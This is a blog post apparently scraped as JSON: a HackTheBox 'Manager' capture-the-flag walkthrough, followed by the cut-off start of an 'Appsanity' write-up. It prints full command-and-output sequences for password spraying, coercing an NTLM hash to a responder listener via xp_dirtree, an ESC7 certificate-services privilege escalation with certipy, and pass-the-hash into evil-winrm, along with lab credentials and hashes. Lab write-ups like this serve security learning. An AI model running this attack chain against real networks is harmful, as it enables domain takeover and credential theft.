| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-10-23T05:24:57 |_Not valid after: 2053-10-23T05:24:57 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-10-23T06:30:56+00:00; +6h59m59s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2023-10-23T06:30:56+00:00; +7h00m00s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-10-23T06:30:14 |_ start_date: N/A |_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.40 seconds From the nmap scanning, we can see this is a domain controller for Active Directory. There are a lot of open ports associated with active directory (ldap, smb, rpc) so we have a wide attack surface to work with.\nProbing Active Directory Firstly checking SMB for anonymous authentication:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~] └─$ cme smb 10.10.11.236 -u \u0026#39;Anonymous\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) SMB 10.10.11.236 445 DC01 [+] manager.htb\\Anonymous: SMB 10.10.11.236 445 DC01 [+] Enumerated shares SMB 10.10.11.236 445 DC01 Share Permissions Remark SMB 10.10.11.236 445 DC01 ----- ----------- ------ SMB 10.10.11.236 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.236 445 DC01 C$ Default share SMB 10.10.11.236 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.236 445 DC01 NETLOGON Logon server share SMB 10.10.11.236 445 DC01 SYSVOL Logon server share Anonymous authentication is allowed, but there are no interesting shares to explore. Next, I see what public data I can see through ldap without credentials:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ┌──(kali㉿kali)-[~/Documents/manager] └─$ ldapsearch -v -x -b \u0026#34;DC=manager,DC=htb\u0026#34; -H \u0026#34;ldap://10.10.11.236\u0026#34; \u0026#34;(objectclass=*)\u0026#34; ldap_initialize( ldap://10.10.11.236:389/??base ) filter: (objectclass=*) requesting: All userApplication attributes # extended LDIF # # LDAPv3 # base \u0026lt;DC=manager,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 Once again, there is no more interesting information. Since there is a web page open on port 80, I decided to take a look at the website.\nEnumerating The Website The web page is a static html. Checking the other listed pages also only shows html pages, so I look into directory brute forcing:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ┌──(kali㉿kali)-[~/Documents/manager] └─$ cat tcp_80_http_feroxbuster_dirbuster.txt | grep 200 200 GET 14l 48w 3837c http://manager.htb/images/logo.png 200 GET 9l 41w 2465c http://manager.htb/images/s-4.png 200 GET 85l 128w 1389c http://manager.htb/css/responsive.css 200 GET 6l 17w 1553c http://manager.htb/images/s-1.png 200 GET 6l 20w 1360c http://manager.htb/images/location-o.png 200 GET 157l 414w 5386c http://manager.htb/about.html 200 GET 82l 542w 56157c http://manager.htb/images/contact-img.jpg 200 GET 4l 20w 1337c http://manager.htb/images/s-2.png 200 GET 149l 630w 53431c http://manager.htb/images/client.jpg 200 GET 10l 43w 2023c http://manager.htb/images/call.png 200 GET 9l 31w 2492c http://manager.htb/images/s-3.png 200 GET 614l 1154w 11838c http://manager.htb/css/style.css 200 GET 4437l 10999w 131863c http://manager.htb/js/bootstrap.js 200 GET 6l 22w 1052c http://manager.htb/images/location.png 200 GET 9l 25w 1255c http://manager.htb/images/envelope.png 200 GET 224l 650w 7900c http://manager.htb/service.html 200 GET 165l 367w 5317c http://manager.htb/contact.html 200 GET 507l 1356w 18203c http://manager.htb/index.html 200 GET 10l 42w 2704c http://manager.htb/images/call-o.png 200 GET 10038l 19587w 192348c http://manager.htb/css/bootstrap.css 200 GET 2l 1276w 88145c http://manager.htb/js/jquery-3.4.1.min.js 200 GET 1313l 7384w 563817c http://manager.htb/images/about-img.png 200 GET 7l 29w 1606c http://manager.htb/images/envelope-o.png 200 GET 507l 1356w 18203c http://manager.htb/ Here we still only see the static webpages, and also js/css files. Nothing interesting once again\nReturning to Active Directory Attacks While obtaining only a username gives limited information, we can also try to AS-REP roast with just usernames. To gather some legitimate usernames, we can enumerate valid users through Kerberos Pre-Authentication (Kerbrute).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 ┌──(kali㉿kali)-[~/…/manager/results/manager.htb/scans] └─$ /home/kali/go/bin/kerbrute userenum -d manager.htb --dc 10.10.11.236 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: dev (n/a) - 10/21/23 - Ronnie Flathers @ropnop 2023/10/21 21:33:30 \u0026gt; Using KDC(s): 2023/10/21 21:33:30 \u0026gt; 10.10.11.236:88 2023/10/21 21:33:31 \u0026gt; [+] VALID USERNAME: ryan@manager.htb 2023/10/21 21:33:33 \u0026gt; [+] VALID USERNAME: guest@manager.htb 2023/10/21 21:33:34 \u0026gt; [+] VALID USERNAME: cheng@manager.htb 2023/10/21 21:33:35 \u0026gt; [+] VALID USERNAME: raven@manager.htb 2023/10/21 21:33:39 \u0026gt; [+] VALID USERNAME: administrator@manager.htb 2023/10/21 21:33:49 \u0026gt; [+] VALID USERNAME: Ryan@manager.htb 2023/10/21 21:33:51 \u0026gt; [+] VALID USERNAME: Raven@manager.htb 2023/10/21 21:33:56 \u0026gt; [+] VALID USERNAME: operator@manager.htb 2023/10/21 21:34:39 \u0026gt; [+] VALID USERNAME: Guest@manager.htb 2023/10/21 21:34:40 \u0026gt; [+] VALID USERNAME: Administrator@manager.htb 2023/10/21 21:35:21 \u0026gt; [+] VALID USERNAME: Cheng@manager.htb 2023/10/21 21:39:57 \u0026gt; [+] VALID USERNAME: jinwoo@manager.htb 2023/10/21 21:41:37 \u0026gt; [+] VALID USERNAME: RYAN@manager.htb 2023/10/21 21:46:29 \u0026gt; [+] VALID USERNAME: RAVEN@manager.htb 2023/10/21 21:46:43 \u0026gt; [+] VALID USERNAME: GUEST@manager.htb 2023/10/21 23:04:09 \u0026gt; [+] VALID USERNAME: zhong@manager.htb Now that we have several users, we can see about AS-REP roasting. If an account has the attribute DONT_REQ_PREAUTH, we can request and retrieve an AS-REP hash for that user. If this hash can be cracked offline, we will get complete login credentials for a user. Unfortunately, trying all our usernames doesn\u0026rsquo;t give us any hash:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/Documents/manager] └─$ impacket-GetNPUsers manager.htb/ -usersfile users.txt -format hashcat -outputfile asreproast.txt Impacket v0.11.0 - Copyright 2023 Fortra [-] User ryan doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User cheng doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User raven doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User operator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User jinwoo doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User zhong doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Guest doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set After nearly all other options are exhausted, I finally consider password spraying with the same list of usernames:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/manager] └─$ cme smb 10.10.11.236 -u users.txt -p users.txt SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) SMB 10.10.11.236 445 DC01 [-] manager.htb\\ryan:ryan STATUS_LOGON_FAILURE \u0026lt;...SNIP...\u0026gt; SMB 10.10.11.236 445 DC01 [+] manager.htb\\operator:operator We have a hit with operator:operator. Very cool\u0026hellip;\u0026hellip;.. With valid credentials, we can dump users to find any we in the kerbrute:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/Documents/manager] └─$ cme smb 10.10.11.236 -u operator -p operator --users SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) SMB 10.10.11.236 445 DC01 [+] manager.htb\\operator:operator SMB 10.10.11.236 445 DC01 [+] Enumerated domain user(s) SMB 10.10.11.236 445 DC01 manager.htb\\Operator badpwdcount: 1 desc: SMB 10.10.11.236 445 DC01 manager.htb\\ChinHae badpwdcount: 1 desc: SMB 10.10.11.236 445 DC01 manager.htb\\JinWoo badpwdcount: 490 desc: SMB 10.10.11.236 445 DC01 manager.htb\\Raven badpwdcount: 452 desc: SMB 10.10.11.236 445 DC01 manager.htb\\Ryan badpwdcount: 501 desc: SMB 10.10.11.236 445 DC01 manager.htb\\Cheng badpwdcount: 499 desc: SMB 10.10.11.236 445 DC01 manager.htb\\Zhong badpwdcount: 1 desc: SMB 10.10.11.236 445 DC01 manager.htb\\krbtgt badpwdcount: 0 desc: Key Distribution Center Service Account SMB 10.10.11.236 445 DC01 manager.htb\\Guest badpwdcount: 0 desc: Built-in account for guest access to the computer/domain SMB 10.10.11.236 445 DC01 manager.htb\\Administrator badpwdcount: 14 desc: Built-in account for administering the computer/domain Now we have a complete user list:\n1 2 3 4 5 6 7 8 9 10 Operator ChinHae JinWoo Raven Ryan Cheng Zhong krbtgt Guest Administrator Foothold Enumeration through MSSQL The user operator can log into the mysql server:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/Documents/manager] └─$ impacket-mssqlclient operator@10.10.11.236 -windows-auth Impacket v0.11.0 - Copyright 2023 Fortra Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (MANAGER\\Operator guest@master)\u0026gt; xp_cmdshell is disabled, but we can still grab the auth hash by using xp_dirtree:\n1 2 3 4 SQL (MANAGER\\Operator guest@master)\u0026gt; xp_dirtree \\\\10.10.14.130\\asdf subdirectory depth file ------------ ----- ---- SQL (MANAGER\\Operator guest@master)\u0026gt; Meanwhile on my kali attacker, responder was set up and receives hash:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/Documents/manager] └─$ sudo responder -I tun0 [sudo] password for kali: __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| \u0026lt;...SNIP...\u0026gt; [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.10.11.236 [SMB] NTLMv2-SSP Username : MANAGER\\DC01$ [SMB] NTLMv2-SSP Hash : DC01$::MANAGER:3ba8f5638ddfbf79:24D8DE0CB08E44422228AFE46D129507:01010000000000008053CCC72005DA010484A96EB96C6D510000000002000800530030005800420001001E00570049004E002D00520035004B004500440038004E00520052004500590004003400570049004E002D00520035004B004500440038004E0052005200450059002E0053003000580042002E004C004F00430041004C000300140053003000580042002E004C004F00430041004C000500140053003000580042002E004C004F00430041004C00070008008053CCC72005DA0106000400020000000800300030000000000000000000000000300000A0D44DBDCE97AF1E697D96B4805912B3F46596596ABF62217A1A9445B02F5E6B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330030000000000000000000 We can see the authentication is done as the system, DC01$. Typically, passwords for this account will be a very long string of random characters, completely unfeasible to crack. After a quick attempt at cracking using the rockyou wordlist, I gave up on this approach.\nEnumerating The Web Server Filesystem Also using xp_dirtree, we can browse the file system. Since we didn\u0026rsquo;t see much in the web directory from the oustide perspective, I decided to check if maybe I can see more by looking at the filesystem:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 SQL (MANAGER\\Operator manager\\operator@master)\u0026gt; xp_dirtree \\inetpub\\wwwroot subdirectory depth file ------------------------------- ----- ---- about.html 1 1 contact.html 1 1 css 1 0 images 1 0 index.html 1 1 js 1 0 service.html 1 1 web.config 1 1 website-backup-27-07-23-old.zip 1 1 The backup file is extremely unusual. While xp_dirtree itself doesn\u0026rsquo;t seem to have the option of downloading, note this is in the web root folder, meaning it should be accessible through the website. Which it is!\nWhen we unzip the backup, note that there is a \u0026ldquo;secret\u0026rdquo; conf file:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/manager/website-backup] └─$ unzip website-backup-27-07-23-old.zip Archive: website-backup-27-07-23-old.zip inflating: .old-conf.xml inflating: about.html \u0026lt;...SNIP...\u0026gt; It contains full credentials for a user on the box:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;ldap-conf xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u0026gt; \u0026lt;server\u0026gt; \u0026lt;host\u0026gt;dc01.manager.htb\u0026lt;/host\u0026gt; \u0026lt;open-port enabled=\u0026#34;true\u0026#34;\u0026gt;389\u0026lt;/open-port\u0026gt; \u0026lt;secure-port enabled=\u0026#34;false\u0026#34;\u0026gt;0\u0026lt;/secure-port\u0026gt; \u0026lt;search-base\u0026gt;dc=manager,dc=htb\u0026lt;/search-base\u0026gt; \u0026lt;server-type\u0026gt;microsoft\u0026lt;/server-type\u0026gt; \u0026lt;access-user\u0026gt; \u0026lt;user\u0026gt;raven@manager.htb\u0026lt;/user\u0026gt; \u0026lt;password\u0026gt;R4v3nBe5tD3veloP3r!123\u0026lt;/password\u0026gt; \u0026lt;/access-user\u0026gt; \u0026lt;uid-attribute\u0026gt;cn\u0026lt;/uid-attribute\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;search type=\u0026#34;full\u0026#34;\u0026gt; \u0026lt;dir-list\u0026gt; \u0026lt;dir\u0026gt;cn=Operator1,CN=users,dc=manager,dc=htb\u0026lt;/dir\u0026gt; \u0026lt;/dir-list\u0026gt; \u0026lt;/search\u0026gt; \u0026lt;/ldap-conf\u0026gt; raven:R4v3nBe5tD3veloP3r!123 With this, we can use evil-winrm to authenticate:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/manager/website-backup] └─$ evil-winrm -i 10.10.11.236 -u raven -p \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Raven\\Documents\u0026gt; Privilege Escalation Active Directory Enumeration via Bloodhound Running SharpHound Active Directory can be very complex to navigate. Fortunately, the tool bloodhound can perform a lot of the enumerations, and organize it visually for us to analyze. The first step is to upload SharpHound.exe, the data collection tool, onto the box.\n1 2 3 4 5 6 7 *Evil-WinRM* PS C:\\Users\\Raven\\downloads\u0026gt; upload /opt/SharpCollection/NetFramework_4.7_x64/SharpHound.exe Info: Uploading /opt/SharpCollection/NetFramework_4.7_x64/SharpHound.exe to C:\\Users\\Raven\\downloads\\SharpHound.exe Data: 965288 bytes of 965288 bytes copied Info: Upload successful! Next, run sharphound:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 *Evil-WinRM* PS C:\\Users\\Raven\\Downloads\u0026gt; .\\Sharphound.exe -c all 2023-10-24T16:13:22.8146576-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-10-24T16:13:22.9240425-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote \u0026lt;...SNIP...\u0026gt; 2023-10-24T16:14:06.9865347-07:00|INFORMATION|SharpHound Enumeration Completed at 4:14 PM on 10/24/2023! Happy Graphing! *Evil-WinRM* PS C:\\Users\\Raven\\Downloads\u0026gt; ls Directory: C:\\Users\\Raven\\Downloads Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/24/2023 4:14 PM 11682 20231024161406_BloodHound.zip -a---- 10/24/2023 4:14 PM 8568 NjQ0M2M1ZmEtNTkyNy00OWNjLWJmNzAtOWZiMzUxMzM4MmNj.bin -a---- 10/24/2023 4:12 PM 723968 SharpHound.exe The resulting .bin file is an artifact that can be removed, while the .zip should be transferred back to kali for bloodhound enumeration.\n1 2 3 4 5 *Evil-WinRM* PS C:\\Users\\Raven\\Downloads\u0026gt; download 20231024161406_BloodHound.zip Info: Downloading C:\\Users\\Raven\\Downloads\\20231024161406_BloodHound.zip to 20231024161406_BloodHound.zip Info: Download successful! Initializing BloodHound Bloodhound relies on neo4j, so we must first start neo4j service. Currently, kali linux does not ship with neo4j installed, so it might need to be installed as well.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/Documents/manager/website-backup] └─$ sudo neo4j start Directories in use: home: /usr/share/neo4j config: /usr/share/neo4j/conf logs: /etc/neo4j/logs plugins: /usr/share/neo4j/plugins import: /usr/share/neo4j/import data: /etc/neo4j/data certificates: /usr/share/neo4j/certificates licenses: /usr/share/neo4j/licenses run: /var/lib/neo4j/run Starting Neo4j. Started neo4j (pid:183758). It is available at http://localhost:7474 There may be a short delay until the server is ready If this is the first time running, neo4j, you need to visit localhost:7474 and change the login credentials off of the default, neo4j:neo4j. Afterwards, bloodhound is finally ready to start:\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/Documents/manager/website-backup] └─$ which bloodhound /usr/bin/bloodhound ┌──(kali㉿kali)-[~/Documents/manager/website-backup] └─$ bloodhound (node:184873) electron: The default of contextIsolation is deprecated and will be changing from false to true in a future release of Electron. See https://github.com/electron/electron/issues/23506 for more information (node:184943) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead. Bloodhound is already in my PATH, but this is not the default.\nRaven is a member of Certificate Service Dcom Access Exploring bloodhound, we can see Raven is a part of this group Certificate Service Dcom Access.\nNote that this relationship exists because Raven is a member of a group, that are members of a group, that are members of a group. Bloodhound tells us this information very easily, but this can be challenging to navigate manually. Thus, is the power of bloodhound visualization!\nExploiting AD Certificate Services This group is something I don\u0026rsquo;t know much about, but doing short research shows some articles mentioning AD Certificate Services for privilege escalation. Another article here. We can use certipy to enumerate the certificate services:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/Documents/manager] └─$ certipy find -u raven@manager.htb -p \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; -dc-ip 10.10.11.236 Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;manager-DC01-CA\u0026#39; via CSRA [*] Got CA configuration for \u0026#39;manager-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20231023144351_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20231023144351_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20231023144351_Certipy.json\u0026#39; The txt/json output gives us a lot of information about certificate services, but one line in particular sticks out:\n1 2 3 \u0026#34;[!] Vulnerabilities\u0026#34;: { \u0026#34;ESC7\u0026#34;: \u0026#34;\u0026#39;MANAGER.HTB\\\\\\\\Raven\u0026#39; has dangerous permissions\u0026#34; } It looks like our user Raven has dangerous permissions over the template \u0026ldquo;ESC7\u0026rdquo;. Very fortunately, the hacktricks article mentioned earlier has a list of commands for exploiting ESC7.\nUsing ESC7 attack #2: Note that because the box seems to reset certificate changes frequently, the following commands must be performed at a relatively fast pace, or else the later commands will result in permission failures. First is to add Raven as an officer:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/manager] └─$ certipy ca -ca \u0026#39;manager-DC01-CA\u0026#39; -add-officer raven -username raven@manager.htb -password \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Successfully added officer \u0026#39;Raven\u0026#39; on \u0026#39;manager-DC01-CA\u0026#39; At this point, I use the domain manager.htb. If this is not added to your /etc/hosts with the ip address of the box, these commands will fail.\nNext, enabling SubCA:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/manager] └─$ certipy ca -u \u0026#39;raven@manager.htb\u0026#39; -p \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; -ca \u0026#39;manager-DC01-CA\u0026#39; -enable-template \u0026#39;SubCA\u0026#39; Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Successfully enabled \u0026#39;SubCA\u0026#39; on \u0026#39;manager-DC01-CA\u0026#39; Now using SubCA, we request a template. The request is denied, but we are still given the option to save the private key, which we will do.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/manager] └─$ certipy req -username raven@manager.htb -password \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; -ca \u0026#39;manager-DC01-CA\u0026#39; -target manager.htb -template SubCA -upn administrator@manager.htb Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. [*] Request ID is 15 Would you like to save the private key? (y/N) y [*] Saved private key to 15.key [-] Failed to request certificate Next, we issue a request using the saved private key.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/manager/sysinternals] └─$ certipy ca -ca \u0026#39;manager-DC01-CA\u0026#39; -issue-request 15 -username raven@manager.htb -password \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Successfully issued certificate Lastly, we can retrieve the issued certificate, giving us administrator.pfx. Note that this pfx is related to the -upn accound we provided previously.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/manager/sysinternals] └─$ certipy req -username raven@manager.htb -password \u0026#39;R4v3nBe5tD3veloP3r!123\u0026#39; -ca \u0026#39;manager-DC01-CA\u0026#39; -target manager.htb -retrieve 15 Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Rerieving certificate with ID 15 [*] Successfully retrieved certificate [*] Got certificate with UPN \u0026#39;administrator@manager.htb\u0026#39; [*] Certificate has no object SID [*] Loaded private key from \u0026#39;15.key\u0026#39; [*] Saved certificate and private key to \u0026#39;administrator.pfx\u0026#39; Now with the pfx file acquired, we can return back to certipy and use it for authorization!\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/manager] └─$ certipy auth -pfx \u0026#39;administrator.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;manager.htb\u0026#39; -dc-ip 10.129.153.73 Certipy v4.8.0 - by Oliver Lyak (ly4k) [*] Using principal: administrator@manager.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to \u0026#39;administrator.ccache\u0026#39; [*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39; [*] Got hash for \u0026#39;administrator@manager.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef With the NT hash, we can employ pass the hash in evil-winrm, and authenticate as administrator.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/Documents/manager] └─$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; ","date":"2024-03-16T06:05:15-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-manager/Manager_hue15099997c54219d9b028a32d5d3e052_325574_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-manager/","title":"HackTheBox - Manager"},{"content":"Enumeration Initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Nmap scan report for 10.129.154.179 Host is up (0.059s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Did not follow redirect to https://meddigi.htb/ 443/tcp open https? 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.62 seconds We see Microsoft IIS on port 80/443, and port 5985 - the WinRM port- open. With such a small attack surface, this is likely a web-based entrypoint. First we must add meddigi.htb to our hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.129.154.179 meddigi.htb In an interesting start, it appears http access is not allowed:\n1 2 3 4 ┌──(kali㉿kali)-[~] └─$ curl http://meddigi.htb/ \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Document Moved\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;Object Moved\u0026lt;/h1\u0026gt;This document may be found \u0026lt;a HREF=\u0026#34;https://meddigi.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;\u0026lt;/body\u0026gt; We are redirected to https.\nThere is an option for login/register here, and further down the main page a section where we might \u0026ldquo;request a call-back\u0026rdquo;. Handling a fake number calling method is something I know very little about, so I start with checking out the sign in/sign up pages:\nEnumerating account registration Upon login, we enter the Profile page, where we might edit our own information or perhaps send a message to supervisors:\nWhen we check the request contents for changing account information, we see a RequestVerificationToken. If this is implemented correctly, we cannot try changing another user\u0026rsquo;s account information.\nRequest data:\n1 Name=asdf\u0026amp;LastName=asdf\u0026amp;Email=asdf%40asdf.asdf\u0026amp;PhoneNumber=1234567890\u0026amp;Password=Appsanity\u0026amp;ConfirmPassword=Appsanity1\u0026amp;__RequestVerificationToken=CfDJ8HpmXdLrgsRMlajdq9P0hbKlkYzqet5VlcN2s9Era-YfuLJbHOjhX49GbZsoiy2SUrOp5HavzSiljfijL_S159CPXuIujVO9vADztksoVOpBKO8veQrv2oRdBeupiV-0k2-8h9rMTAUm5RcQirzr5hd1WOVTlZMAik1CxCftgdtyf_4vzJWXPpYcVtQ7xH_TLA We can send something to Supervisors, but it appears we don\u0026rsquo;t have a way to view our request. Currently, the best we can probably do is send an XSS payload either in this message location, or perhaps earlier on the call-back form.\nDiscovery of portal subdomain We can try gobuster to enumerate subdomains:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌──(kali㉿kali)-[~/Documents/Appsanity] └─$ gobuster vhost -u https://meddigi.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://meddigi.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: portal.meddigi.htb Status: 200 [Size: 2976] We can find another at portal.meddigi.htb:\nThere is not much we can do here, and directory fuzzing didn\u0026rsquo;t show us anything else we might view without valid credentials first.\nExamining authenitcation token Decoding our JWT token might be interesting. Note in this 